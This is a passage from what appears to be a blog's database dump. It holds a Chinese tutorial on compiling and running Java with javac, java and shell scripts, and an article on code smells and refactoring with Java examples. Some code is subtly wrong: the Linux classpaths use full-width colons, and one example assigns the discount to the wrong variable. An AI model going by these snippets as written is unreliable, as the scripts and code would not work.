么去跑。好比给你瓶水，你不知道怎么打开去喝，然后活活给渴死。</p>\r\n\r\n<p>之前用惯了Myeclipse，Java文件编译运行的命令基本忘得一干二净。现在项目出了原型，放到服务器上去测试，SSH一登陆上服务器就傻眼了，都是命令行，以前程序图标什么的都成了浮云，程序放上去了不知道怎么去编译运行，只能补补课了，下面做下补课笔记。</p>\r\n\r\n<p>一、javac命令javac 用于编译Java文 件，格式为：java [options]&nbsp; [sourcefiles]&nbsp; [@files]其中：options：命令行选项；sourcefiles：一个或多个要编译的源文件；@files：一个或多个对源文件进行列表的文 件，有时候要编译的文件很多，一个个敲命令会显得很长，也不方便修改，可以把要编译的源文件列在文件中，在文件名前加@，这样就可以对多个文件进行编译， 对编译一个工程很有用，方便，省事。</p>\r\n\r\n<p>有几个比较重要的选项：-d&nbsp; 用于指定编译成的class文件的存放位置，缺省情况下不指定class文件的存放目录，编译的class文件将和源文件在同一目录 下；-classpath&nbsp; 可以简写成-cp，用于搜索编译所需的class文件，指出编译所用到的class文件的位置，如jar、zip或者其他包含class文件的目录，指定 该选项会覆盖CLASSPATH的设定；-sourcepath用于搜索编译所需的源文件（即java文件），指定要搜索的源文件的位置，如jar、 zip或其他包含java文件的目录；需要注意windows下和linux下文件路径分隔符和文件列表（即-classpath和-sourcepath指定的文件）分隔符的区别：windows下文件路径分隔符用 \\ ，文件列表分隔符用分号 ；linux下 文件路径分隔符用 / ，文件列表分隔符用冒号 ：二、java命令java 用于执行程序，格式如下：java [options]&nbsp; classfile options：命令行选项，一般用于 -classpath&nbsp; 指定要执行的文件所在的位置以及需要用到的类路径，包括jar、zip和class文件目录，会覆盖CLASSPATH的设定三、脚本如果要敲的命令很 长，每次要编译运行的时候都要重新敲一遍，这是一件很痛苦的事情，所以用脚本可以大大方便你的工作量。在linux下用shell脚本，windows下 用bat批处理程序。因为是在linux下，我这里只是简单介绍一下shell，关于bat批处理程序的语法自己百度一下，不难。</p>\r\n\r\n<p>1. 开头linux有很多不同的shell，通常使用bash（bourne again&nbsp; shell），程序必须以下面的行开始：#！/bin/sh&nbsp; #！用来告诉系统用后面的参数来执行程序，这里使用的是/bin/sh要使你的脚本能够执行，还必须让这个文件有可执行权限，使用下面命令更改文件权 限：chmod +x filename 2. 注释以#开始的句子表示注释，一直到这行结束，多写注释有利于以后重新看的时候知道自己在做什么3.&nbsp; 变量shell的脚本的变量都是字符串，不用申明类型，定义的时候直接&nbsp; 变量=值&nbsp; 即可，用到变量的的时候用 $变量 或者&nbsp; ${变量}，echo命令用于打印，举个例子：#！/bin/sh # 定义变量words，值为hello world words=&quot;hello&nbsp; world&quot; # 打印变量words的值echo $words 4.&nbsp; 命令shell脚本里面可以直接任意使用linux命令，要用到什么命令直接敲进去即可。记住一些常用的命令：cd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 打开目录ls -l&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示目录信息rm -fr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 递归删除目录及下面的文件，不提示信息mkdir&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 创建目录pwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示当前路径kill&nbsp; -9 pid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 强制杀掉某个进程号的进程pkill&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 杀掉某个名字的进程ps&nbsp; aux&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示运行进程信息netstat -pan&nbsp; 查看网络端口监听情况四、例子下面是文件compile，用于编译整个java工程，把编译的文件放到指定目录下：</p>\r\n\r\n<p>view plain #！/bin/sh # Define some constants ONSSERVER=ONSServer&nbsp; PROJECT_PATH=/root/iot-oid JAR_PATH=$PROJECT_PATH/lib&nbsp; BIN_PATH=$PROJECT_PATH/bin SRC_PATH=$PROJECT_PATH/src/$ONSSERVER</p>\r\n\r\n<p># First remove the sources.list file if it exists and then create&nbsp; the sources file of the project rm -f $SRC_PATH/sources find&nbsp; $SRC_PATH/com -name *.java &gt; $SRC_PATH/sources.list</p>\r\n\r\n<p># First remove the ONSServer directory if it exists and then create&nbsp; the bin directory of ONSServer rm -rf $BIN_PATH/$ONSSERVER mkdir&nbsp; $BIN_PATH/$ONSSERVER</p>\r\n\r\n<p># Compile the project javac -d $BIN_PATH/$ONSSERVER -classpath&nbsp; $JAR_PATH/jdom.jar：$JAR_PATH/oro-2.0.8.jar&nbsp; @$SRC_PATH/sources.list下面是文件run，用于执行程序：view plain #！/bin/sh</p>\r\n\r\n<p># Define some constants ONSSERVER=ONSServer PROJECT_PATH=/root/iot-oid JAR_PATH=$PROJECT_PATH/lib BIN_PATH=$PROJECT_PATH/bin</p>\r\n\r\n<p># Run the project as a background process nohup java -classpath&nbsp; $BIN_PATH：$JAR_PATH/jdom.jar：$JAR_PATH/oro-2.0.8.jar&nbsp; com.ONSServer.DoUDPRequest&nbsp; &amp;以上是对javac、java和shell脚本的简单总结，用的比较简单，如有错误，欢迎指正！</p>\r\n\r\n<p><br />\r\n转自: http://java.chinaitlab.com/net/867582.html</p>\r\n',0,1437806487,0,0),(58,11,'唯有写出人类容易理解的代码，才是优秀的程序员','<p>Bad Smells &amp; Refactoring</p>\r\n\r\n<p>1 题记</p>\r\n\r\n<p>Any fool can write code that a computer can understand. Good programmers write code that humans can understand.&mdash;&mdash;Martin Fowler</p>\r\n\r\n<p>（任何一个傻瓜都能写出计算机可以理解的代码。唯有写出人类容易理解的代码，才是优秀的程序员。）</p>\r\n\r\n<p>2 Bad Smells</p>\r\n\r\n<p>2.1 Duplicated Code重复的代码</p>\r\n\r\n<p>（重复代码，不需要定义，大家都知道是什么东东。）</p>\r\n\r\n<p>1． &ldquo;重复的代码&rdquo;有什么不好？（比方说，从可维护性的角度看，很多地方的代码看似一样，又有可能有细微差别，对读代码的人容易产生困扰，于是可以定罪，</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>可读性不好；同样的修改可能需要修改多次，而且容易遗漏，可修改性不好。）（但是，重复代码也有好处啊，代码行数多，千行代码故障率会少，对我们的考核比</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>较有利&hellip;&hellip;开玩笑的是么？）</p>\r\n\r\n<p>2． 代码重复到什么程度，Smell才算Bad？（if (filename == null || filename.trim().equals(&quot;&quot;))这句话可作为例子，我们认为这句话就算是重复代码了，比如</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>哪天filename.trim().equals(&quot;&quot;)这个判断我觉得不好，想要换成filename.trim().length() == 0，那么岂不是霰弹式修改？使用绝技&ldquo;Ctrl-C/ Ctrl-V&rdquo;、同时还</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>有用&ldquo;Ctrl-F&rdquo;，因为大家没有住在一起，要搜索一下才联系得到&hellip;&hellip;）</p>\r\n\r\n<p>3． 三种情况的重复代码：</p>\r\n\r\n<p>a) 同一个class中的两个method含有相同表达式。（Extract Method）</p>\r\n\r\n<p>b) 两个互为兄弟的subclass内含有相同表达式。（Extract Method、Pull up Method、Form Template Method）</p>\r\n\r\n<p>c) 两个毫不相关的class内含有相同表达式。（ Extract Method、 Extract Class）</p>\r\n\r\n<p>2.2 Long Method过长函数</p>\r\n\r\n<p>2.2.1 &ldquo;过长函数&rdquo;有什么不好？</p>\r\n\r\n<p>1． 可读性：使用短函数，高层函数看起来像系列注释、低层函数不超过（比方说）10行，逻辑一目了然，可读性更优。</p>\r\n\r\n<p>2． 可重用性：（长函数可能包含逻辑A/B/C，想单独重用A逻辑，不可能。一个类比的例子，发动机的重用机会肯定比车大。大家知道深圳BYD使用的是三菱发动机，</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>标致307/206 1.6系列使用的发动机跟富康、爱丽舍16V系列是相同的。发动机上面的螺丝重用机会更大。很多不同种类发动机上使用的螺丝很可能是同一个厂家生产</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>的相同螺丝。）</p>\r\n\r\n<p>3． 可插入性：使用短函数，利用Override等操作，替换处理逻辑会更加容易。比如，更容易应用模板方法模式Template Method，参见Form Template Method章节。</p>\r\n\r\n<p>2.2.2&nbsp; &ldquo;短函数&rdquo;难道没有缺点？</p>\r\n\r\n<p>1． 调用开销？（现代OO语言几乎已经完全免除了进程内的&ldquo;函数调用动作的额外开销&rdquo;。）</p>\r\n\r\n<p>2． 看代码的时候，跳来跳去，很心烦？（高层函数看起来像系列注释，而且函数名字起得好，单纯看代码，比如接手模块的时候，低层的函数甚至可以不看。）</p>\r\n\r\n<p>2.2.3 函数到了多长，Smell才算Bad？（写多长的函数才比较合适？）</p>\r\n\r\n<p>1． 李维说：5行。（李维大家认识么？台湾IT界著名散文家，与侯捷齐名。不得不承认，此处我断章取义了，他说&ldquo;5行&rdquo;，是有一定语境的，他是想说&ldquo;很短&rdquo;的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>意思，建议大家不要追究他说的是5还是6。）</p>\r\n\r\n<p>2． Martin Fowler说：长度不是问题，关键在于函数名称和函数本体之间的语义距离。（Martin Fowler大家认识么？《重构》《UML精粹》《分析模式》《企业应用</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>架构模式》等经典著作的作者。后面，Martin还是，如果提炼动作可以强化代码的清晰度，那就去做，就算函数名称比提炼出来的代码还长也无所谓。什么叫做&ldquo;函</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>数名称与函数本体之间的语义距离&rdquo;？函数名称要能概括函数体的动作，我引用的这句话没有能表达Martin的所有意思。）</p>\r\n\r\n<p>3． 王振宇说：应该很短、可以较长，只要函数是在做一件从语义上无法再次拆解的事。（王振宇大家认识么？注意到没有，我们认为这句话是对Martin上一句话的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>补充，在函数体的组织方式上做了要求。简单说就是，一个函数做一件事儿。Extract Method中的那个例子。）</p>\r\n\r\n<p>2.3 Large Class（过大类）</p>\r\n\r\n<p>（一个例子）</p>\r\n\r\n<p>1． &ldquo;过大类&rdquo;有什么不好？（难维护、容易出现重复代码。）</p>\r\n\r\n<p>2． &ldquo;过大类&rdquo;的常见情况：</p>\r\n\r\n<p>a) 本应该是针对不同类的操作放到一个类中。（比如，某些类本应拆出一些小的零件类，该类与零件类之间可能是关联、依赖关系，但没有这么做，而是所有代码放</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在一个类中。）</p>\r\n\r\n<p>b) 大量静态方法放在&ldquo;*Comm&rdquo;类中。</p>\r\n\r\n<p>i. 现象：大量静态方法放在&ldquo;Comm&rdquo;类中。很像C的函数库。（这个现象常见么？好不好？）</p>\r\n\r\n<p>ii. 评述：这是一种使用面向对象语言编写面向过程代码的尝试。我个人觉得这类尝试是一种倒退，拒绝面向对象所带来的所有特性。没有很好地封装，程序的结构</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>化不好；使用方与之的依赖是静态的；没有可插入性。</p>\r\n\r\n<p>iii. 措施：解决这个问题的做法是，按照操作实施在哪个对象身上来把操作规划到对象所在的类里面；如果保持静态方法不变，也不要所有方法放到一个类中，最好</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>按照语义来划分到合适的类。JDK类库提供了那么多方法，很少出现静态函数库的现象。当然，也不是说不存在，比如Math、ArrayList等类，不过至少他们在语义上</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>分得很清晰。一个例子，比如，String的substring方法，很可能被一些程序员设计成public static，因为他们可能觉得无法把这个方法归属到哪个类中，于是放到</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&ldquo;Comm&rdquo;类中。（大家体会一下？是不是这么个事儿。）</p>\r\n\r\n<p>iv. 疑问：那不是想调用某个方法的时候就要new一个实例（性能问题！）？首先，这又是面向过程的思维方式，想的是过程、调用，而不是对象、依赖、关联。其次</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>，轻量级的对象，创建、回收成本很低。我曾经对一些不同算法、策略从性能角度做过相应的比较试验，通常，执行次数在10w-100w以上量级时，才有差别。我使用</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>面向对象的做法，可以明显地获得更优的可维护性（可读、可扩展、可改、可插入、可重用），而且面向对象本身不会造成什么性能问题。当然，具体情况要具体分</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>析，如有明显的性能隐患，最好能够做一个简单的试验，用数据来说话。做个类比，说某些政客在很多场合的潜台词中认为，民主、自由会破坏安定的大好局面，显</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>然不能够让人信服；同样，说面向对象增加了对象的创建、销毁成本，会影响性能，影响软件系统的稳定局面，也是不能够让人信服的。于是在编程时尽可能地使用</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>静态方法，这种做法，不可取。</p>\r\n\r\n<p>3． 类长到多大才算&ldquo;Large&rdquo;？类，应该较小、可以较大，只要该类从语义上无法再次拆解。（&ldquo;发动机&rdquo;类，可以包含对&ldquo;螺丝&rdquo;类的引用（关联），但不要把&ldquo;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>螺丝&rdquo;类的操作也放到&ldquo;发动机&rdquo;类中来实现。）</p>\r\n\r\n<p>2.4 Long Parameter List（过长参数列）</p>\r\n\r\n<p>1． &ldquo;过长参数列&rdquo;有什么不好？（难读、难用、难记，还有一点，无法获得对象所带来的优势。比如，参数之间的约束关系没有得到很好地封装。例如，</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>startTime/endTime，他俩作为参数来讲，可能不算长，这里仅做示例来说事儿。这对表示时间范围的参数可能多处使用，在没有包装成对象的时候，如果要保</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>证&ldquo;startTime &lt; endTime&rdquo;这个约束，就需要所有用到这对参数的地方都做判断；包装成对象，情况就好多了，比如叫做TimeRange，在类的构造函数中可以做这个</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>判断。显然，使用对象，把变化封装得好一些。）</p>\r\n\r\n<p>2． 想一下，JAVA类库的函数，比起C类库的函数，传递的参数是不是大都短很多？（应该是。这体现了面向对象的优势。）</p>\r\n\r\n<p>3． &ldquo;参数太多&rdquo;这个Smell如何去除？</p>\r\n\r\n<p>a) Introduce Parameter Object，无非是把多个参数封装成一个对象。</p>\r\n\r\n<p>2.5 Divergent Change（发散式变化）</p>\r\n\r\n<p>1． 什么是&ldquo;发散式变化&rdquo;？</p>\r\n\r\n<p>a) &ldquo;某一个类受到多种变化的影响&rdquo;，A/B/C/D&hellip;&hellip;多种功能变化的时候它都需要修改。</p>\r\n\r\n<p>2． 为什么会造成&ldquo;发散式变化&rdquo;？哪儿没弄好？</p>\r\n\r\n<p>a) 大致是由于这个类担负了多项任务，太操心了，不该他做的事儿也来做，越俎代庖。很可能需要再拆分几个类出来，把变化封装得更细。</p>\r\n\r\n<p>3． 历史教训（反面教材）（以前我写配置MAF端代码的时候，写过一个P_Unit类，他处理所有BSC单元的逻辑，但各种单板的逻辑是不一样的，于是DTB改逻辑的时候</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>要修改P_Unit、ABPM改的时候要修改P_Unit、IPCF、UPCF、GCM&hellip;&hellip;所有具有特殊逻辑的单板修改功能的时候，他都要修改，甚至HDLC/UID等逻辑修改的时候P_Unit都</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>要改。显然该类管得太多了。后来，我看了一本书，翻然悔悟，痛下把代码决心做了重构。其实早在03年，徐峰（据说徐峰要离开公司，这么牛的人离开了对我们整</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>个OMC损失很大，我在这里提一下他的名字，简陋地送别一下。）做配置CAF的时候建议我针对每种有特殊逻辑的板子弄一个类，我完全不以为然。显然，当时没有理</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>解&ldquo;封装变化&rdquo;这四个字。）</p>\r\n\r\n<p>2.6 Shotgun Surgery（霰弹式修改）</p>\r\n\r\n<p>1． 什么是&ldquo;霰弹式修改&rdquo;？</p>\r\n\r\n<p>a) &ldquo;一个变化引发多个类的修改&rdquo;，完成某个需求的时候，A/B/C/D&hellip;&hellip;多个类都需要修改。</p>\r\n\r\n<p>2． 为什么会造成&ldquo;霰弹式修改&rdquo;？哪儿没弄好？</p>\r\n\r\n<p>a) 大致是多个类之间的耦合太严重。很可能是类没有规划好，没有把变化封装得足够令人满意。</p>\r\n\r\n<p>3． 一个插曲：记得此前讨论这个Bad Smell的时候，严钧认为，去掉这个Bad Smell不好强求，而且举出Abstract Factory模式作为例证。也有道理。我在这一点上</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>是这么认为的：我们要清楚的认识到我们努力的方向，Abstract Factory模式同样不完美，它没有满足Open-Close原则。我们可以在某些条件（包括技术条件）受限</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>的时候写出不完美的代码，但一定要知道它是不完美的。</p>\r\n\r\n<p>a) Factory Method模式（工厂方法）代替Abstract Factory来说事儿。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>每增加一种Produce的实现类，就要同时增加一个对应该类的Creator类。当时严钧可能说的是Abstract Factory模式，我用Factory Method模式来说事儿，因为他简</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>单些，但同样可以说明问题。</p>\r\n\r\n<p>b) Open-Close原则</p>\r\n\r\n<p>软件实体应该对扩展开放，对修改关闭。Open-Close原则是一个愿景性质的原则，如果系统能够达到Open-Close原则描述的情形就比较理想了，对扩展开放、对修改</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>关闭，即，不修改原有代码即可完成对系统的扩展。系统可以获得最大可能的稳定性，加功能的时候旧有代码不修改，当然不会带入BUG。</p>\r\n\r\n<p>? 玉帝招安美猴王的故事</p>\r\n\r\n<p>齐天大圣美猴王，想当初可是功夫了得，从东海龙王那儿拿了根棍儿，大闹天宫&hellip;&hellip;叫嚣得不行（后来怎么不灵了，一根灯草、一根头绳、一条看大门的狮子狗都整</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>不过），喊出来一些革命口号：&ldquo;皇帝轮流做，明年到我家&rdquo;，&ldquo;只教他搬出去，将天宫让与我！&rdquo;。有一些农民起义领袖的风范。</p>\r\n\r\n<p>太白金星给玉皇大帝打了个报告出主意：&ldquo;把他宣来上界&hellip;&hellip;与他籍名在箓&hellip;&hellip;一则不动众劳师，二则收仙有道也&rdquo;。</p>\r\n\r\n<p>玉皇大帝遵循Open-Close原则招安了美猴王。不动众劳师，不破坏天规，是关闭对已有系统的修改，不修改，是Closed。收仙有道，是对已有系统的扩展，可扩展，</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>是Open。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>同时应用了依赖倒换原则，合成/聚合复用原则，以后有机会给大家讲讲面向对象的设计原则。</p>\r\n\r\n<p>4． 讲回霰弹式修改这个smell，很多程序在接手时，前辈一再嘱咐，改什么功能的时候，一定要注意，什么什么&hellip;&hellip;一堆地方必须同时修改，要细心不要漏了&hellip;&hellip;这</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>很可能是设计水平的问题给维护造成的难度。其实如果程序设计得好，此后的工作将愉快很多。（插播广告）我记得，刚看到斯诺克比赛在电视上转播的时候（那时</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>候还小，初中吧，还没见过真的斯诺克台球桌），很不屑，觉得他们大部分时候在打一些比较近距离的球，最多半张台子距离吧，我甚至盲目自信，感觉那些球我都</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>能打进，电视上的人有什么了不起。其实大家都知道，母球走位是难度更大、更重要的工作（要经过全盘性思考的），走位走好了，下一杆就好打；就好比做软件，</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>程序结构设计得好，维护就更容易。</p>\r\n\r\n<p>2.7 Data Clumps（数据泥团）</p>\r\n\r\n<p>1． 什么是&ldquo;数据泥团&rdquo;？</p>\r\n\r\n<p>a) 某些数据项经常黏在一起行动，称之为&ldquo;数据泥团&rdquo;。时间长了就应该考虑是不是该把他们封装到一个对象中，来封装这个泥团所可能具有的逻辑。（比如一堆表</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>示定位信息的字段，system、subsystem、unit、rack、shelf、slot&hellip;&hellip;总是一起出现。）（这个Bad Smell在在很多时候与Long Parameter List，是一样的，但</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Data Clumps的涵盖范围比Long Parameter List要大一些，比如，某些类的Field，可能没有当作参数来传递，但是总是黏在一起，也可能出现数据之间的逻辑，于是</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>也需要绑成一个对象，来做封装。）</p>\r\n\r\n<p>2． 如何判断是否属于&ldquo;数据泥团&rdquo;？</p>\r\n\r\n<p>a) 删掉这些数据项中的其中之一项，其他数据有没有因此失去意义？（比如startTime/ endTime，就是成对表示时间范围的，去掉其中一个，另一个失去意义。）</p>\r\n\r\n<p>2.8 Switch Statements（Switch惊悚现身）</p>\r\n\r\n<p>（惊悚现身，很像香港翻译好莱坞电影片名的风格是么？）</p>\r\n\r\n<p>1． Switch语句有什么不好？</p>\r\n\r\n<p>a) 容易形成&ldquo;长函数&rdquo;（比较容易理解）</p>\r\n\r\n<p>b) 容易形成&ldquo;霰弹式修改&rdquo;</p>\r\n\r\n<p>2． 如何替换掉Switch语句？</p>\r\n\r\n<p>a) 多态（使用Pet的例子的第三个版本来说明）</p>\r\n\r\n<p>3． 是不是使用多态可以去掉所有Switch语句？</p>\r\n\r\n<p>a) 不是。比如，根据消息号，分发把消息分发到相应的处理函数（处理类）来处理。（原因是某些情况下，调用端无法动态创建确切（子类的）实例，于是依然需要</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>分发过程。即，需要Switch语句分发、或者&ldquo;配置文件+反射&rdquo;的方式分发。）</p>\r\n\r\n<p>4． 对Switch语句有什么要求？</p>\r\n\r\n<p>a) Switch语句可以存在，但每个case的处理语句不应超过2-3行。</p>\r\n\r\n<p>2.9 Comments（过多的注释）</p>\r\n\r\n<p>（首先，注释本身没有错，很多时候注释是必须存在的。但，注释过多，就是坏味道了。）</p>\r\n\r\n<p>1． Why？为什么？</p>\r\n\r\n<p>a) 过多的注释，是降低代码可读性的帮凶。（如果，代码只有通过大量注释才能被理解，那么说明代码的可读性不好。事实上，很多文章也就此有些说法：代码要写</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>得&ldquo;自解释能力强&rdquo;、自己解释自己；代码就是文档。这就要求，类、方法的编写要清爽，类名、方法名、变量名要起得好。）</p>\r\n\r\n<p>2． How？如何写好注释？（Why？How？想起那个关于两个渔夫和一个美人鱼的荤笑话，由于有未成年人士在场，我不便当众详细讲。）</p>\r\n\r\n<p>a) 写&ldquo;why&rdquo;。（注释应该写代码的编写思路，特别是某些地方没有按常理出牌，要写注释来说明。比如，对数组做for循环遍历，边界一般是数组的length，如果某</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>一次出于某种特殊考虑，没这么做，就需要注释说明。）</p>\r\n\r\n<p>b) 不写&ldquo;what&rdquo;。（注释不要写代码是干什么的，&ldquo;what&rdquo;这样的信息应该尽量包含在类名、方法名、变量名中。）</p>\r\n\r\n<p>c) 不写充数注释。（不要为了写注释而写注释，不要往猪肉里注水，虽然没什么大碍，但终归是没品味的做法。比如，&ldquo;String a = null;//创建一个String实例。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&rdquo;看到这样的注释，我胃口都不舒服。虽然部门有注释比例的要求，但像我们这样的高级程序员、高级工程师，还是不要充数用的注释。）</p>\r\n\r\n<p>3 Refactoring</p>\r\n\r\n<p>3.1 Extract Method</p>\r\n\r\n<p>void printOwing() {</p>\r\n\r\n<p>&nbsp; printBanner();</p>\r\n\r\n<p>&nbsp; //print details</p>\r\n\r\n<p>&nbsp; System.out.println (&quot;name:&quot; + _name);</p>\r\n\r\n<p>&nbsp; System.out.println (&quot;amount&quot; + getOutstanding());</p>\r\n\r\n<p>}</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>void printOwing() {</p>\r\n\r\n<p>&nbsp; printBanner();</p>\r\n\r\n<p>&nbsp; printDetails(getOutstanding());</p>\r\n\r\n<p>}</p>\r\n\r\n<p>void printDetails (double outstanding) {</p>\r\n\r\n<p>&nbsp; System.out.println (&quot;name:&quot; + _name);</p>\r\n\r\n<p>&nbsp; System.out.println (&quot;amount&quot; + outstanding);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>（前面说了，函数应该短。重复一下带来的好处：可读性好，高层函数像注释、低层函数行数少；可重用性好，比如上例中的printDetails，可能别处也能用，重构</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>前是无法被重用的；可插入性好，子类可能写一个新的printDetails，使用不同格式打印。）</p>\r\n\r\n<p>3.1.1 抽取函数时候，参数、临时变量如何处理</p>\r\n\r\n<p>1． Replace Temp With Query 去掉临时局部变量，代之以查询类的方法，拆开的小函数需要此临时变量的时候，就调用这个查询方法。</p>\r\n\r\n<p>2． Introduce Parameter Object 让长参数列变得简洁。</p>\r\n\r\n<p>3． Replace Method with Method Object 去掉多个参数、局部变量。为待重构的大函数创建一个对象，这样，所有方法内的临时变量就变成对象的field，于是大函</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>数拆开的所有小函数就共享这些field，不必再使用参数传递。</p>\r\n\r\n<p>3.1.2 起名字很重要！名字应该：（此处的名字包括函数、类等）</p>\r\n\r\n<p>1． 清晰、恰当。表达的信息涵盖函数的所作所为。</p>\r\n\r\n<p>a) 当一个函数名字为了涵盖函数所为&ldquo;必须&rdquo;起成&ldquo;do1stThingAndDo2ndThing&rdquo;的时候，就有必要实施Extract Method来抽取函数了。</p>\r\n\r\n<p>b) 一个OMC代码中的例子，某函数叫做checkParameter，但函数体中除了检查参数之外，还&ldquo;顺便&rdquo;为几个类属性赋值，虽然此函数很短、很超值，但我们认为他的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>命名是不恰当的，甚至他的函数设计也是不恰当的，一个函数要干单纯的一件事儿，函数内部从语义上无法再次分解。</p>\r\n\r\n<p>2． 尽量简短、可以较长。但应该首先满足上一条要求。</p>\r\n\r\n<p>a) compareToIgnoreCase（String类的方法）、getDisplayLanguage（Locale类的方法）、getTotalFrequentRenterPoints（《重构》书中的示例代码），这些函数</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>名长不长？（重要的是把信息表述清楚，名字长一点没关系。）</p>\r\n\r\n<p>3.2 Replace Temp with Query</p>\r\n\r\n<p>double basePrice = _quantity * _itemPrice;</p>\r\n\r\n<p>if (basePrice &gt; 1000)</p>\r\n\r\n<p>&nbsp; return basePrice * 0.95;</p>\r\n\r\n<p>else</p>\r\n\r\n<p>&nbsp; return basePrice * 0.98;</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>if (basePrice() &gt; 1000)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; return basePrice() * 0.95;</p>\r\n\r\n<p>&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; return basePrice() * 0.98;</p>\r\n\r\n<p>&hellip;</p>\r\n\r\n<p>double basePrice() {</p>\r\n\r\n<p>&nbsp; return _quantity * _itemPrice;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>（例子很容易理解，basePrice是临时变量，临时变量的问题在于：它们是暂时的，而且只能在所属函数内使用。由于临时变量只有在所属函数内才可见，所以它们会</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>驱使你写出更长的函数，因为只有这样你才能访问到想要访问的临时变量。如果把临时变量替换为一个查询式（query method），那么同一个class中的所有函数都将</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>可以获得这份信息。为拆解大函数提供了方便。）</p>\r\n\r\n<p>3.2.1 一个借助Replace Temp with Query来提炼函数的例子</p>\r\n\r\n<p>double getPrice() {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; int basePrice = _quantity * _itemPrice;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; double discountFactor;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; If (basePrice &gt;1000) discountFactor = 0.95;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; else basePrice = 0.98;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; return basePrice * discountFactor;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>重构为：</p>\r\n\r\n<p>double getPrice() {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; return basePrice() * discountFactor();</p>\r\n\r\n<p>}</p>\r\n\r\n<p>private int basePrice() {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; return _quantity * 